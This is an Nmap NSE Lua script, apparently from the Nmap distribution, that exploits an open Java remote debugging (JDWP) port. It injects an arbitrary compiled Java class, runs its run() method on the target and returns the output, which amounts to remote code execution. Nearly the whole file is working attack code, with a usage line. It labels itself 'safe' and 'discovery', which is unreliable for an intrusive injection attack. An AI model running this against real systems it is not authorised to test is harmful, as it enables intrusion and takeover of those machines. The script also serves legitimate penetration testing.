local jdwp = require "jdwp"
local stdnse = require "stdnse"
local nmap = require "nmap"
local shortport = require "shortport"
local string = require "string"

description = [[
Script to exploit java's remote debugging port. 

When remote debugging port is left open, it is possible to inject 
java bytecode and achieve remote code execution.

After injection, class' run() method is executed.
Method run() has no parameters, and is expected to return a string.

You can specify your own .class file to inject by <code>filename</code> argument.
See nselib/data/jdwp-class/README for more.
]]

author = "Aleksandar Nikolic" 
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"safe","discovery"}

---
-- @usage nmap -sT <target> -p <port> --script=+jdwp-inject --script-args filename=HelloWorld.class
--
-- @args filename	Java .class file to inject.
-- @output
-- PORT     STATE SERVICE REASON
-- 2010/tcp open  search  syn-ack
-- | jdwp-inject:
-- |_  Hello world from the remote machine!
--
portrule = function(host, port)
        -- JDWP will close the port if there is no valid handshake within 2
	-- seconds, Service detection's NULL probe detects it as tcpwrapped.
        return port.service == "tcpwrapped"
               and port.protocol == "tcp" and port.state == "open"
               and not(shortport.port_is_excluded(port.number,port.protocol))
end

action = function(host, port)
	stdnse.sleep(5) -- let the remote socket recover from connect() scan
	local status,socket = jdwp.connect(host,port) -- initialize the connection
	if not status then
		stdnse.print_debug("error, %s",socket)
	end

	-- read .class file 
	local filename = stdnse.get_script_args(SCRIPT_NAME .. '.filename')
	if filename == nil then
		stdnse.print_debug("This script requires a .class file to inject.")
		return false 
	end
	local file = io.open(nmap.fetchfile(filename), "rb") 
	local class_bytes = file:read("*all")
	
	-- inject the class
	local injectedClass
	status,injectedClass = jdwp.injectClass(socket,class_bytes)
	-- find injected class method
	local runMethodID = jdwp.findMethod(socket,injectedClass.id,"run",false)
	
	if runMethodID == nil then
		stdnse.print_debug("Couldn't find run method.")
		return false
	end	
	
	-- invoke run method
	local result 	
	status, result = jdwp.invokeObjectMethod(socket,0,injectedClass.instance,injectedClass.thread,injectedClass.id,runMethodID,0,nil) 
	-- get the result string
	local stringID
	_,_,stringID = bin.unpack(">CL",result)
	status,result = jdwp.readString(socket,0,stringID)	
	-- parse results 
	return stdnse.format_output(true,result)	
end

